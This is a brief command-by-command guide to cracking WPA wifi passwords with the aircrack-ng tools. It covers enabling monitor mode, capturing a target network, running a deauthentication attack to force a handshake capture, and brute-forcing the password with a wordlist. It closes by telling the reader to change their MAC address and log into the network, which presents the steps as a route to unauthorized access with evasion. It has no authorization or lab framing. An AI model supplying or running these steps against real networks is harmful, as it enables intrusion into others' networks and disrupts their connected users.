### Wifi Cracking Steps ###

[*] airmon-ng
    This will give you the wifi card adapter.

[*] airmon-ng start <wifi device>
    This will give you the monitoring wifi device, example wlan0mon.

[*] airodump-ng <mon device>
    Start monitoring and looking for wifi devices, you will need the BSSID.
    <mon device> example is wlan0mon

[*] airodump-ng -c <channel number> --bssid <bssid hex> -w <dump file> <mon device>
    Input the channel station number under -c
    Input the bssid  hex under --bssid
    Dump file to write to under the -w flag, this is saved as .cap
    <mon device> example is wlan0mon

[*] aireplay-ng -0 <count> -a <bssid> <mon device>
    While airodump-ng is running, open a new terminal and run this command.
    This will start the deauth to end sessions and reveal the WPA handshake.
    <count>, start with 0
    <bssid> enter in the bssid we have been monitoring
    <mon device> same monitoring device, example wlan0mon

[*] Stop the Deauth (aireplay-ng) and the airodump-ng monitoring terminal commands from executing. Now that we have what we need, the output file from <dump file> above will help us brute force paswords.

[*] aircrack-ng -w <wordlist> <dump file>.cap
    This initiates the bruteforce on the <dump file>.cap to obtain password!

[*] airmon-ng stop <mon device>
    This stops the monitoring on monitoring device.
    <mon device> example is wlan0mon


[*] You know what to do, change your MAC and log into the wifi network.
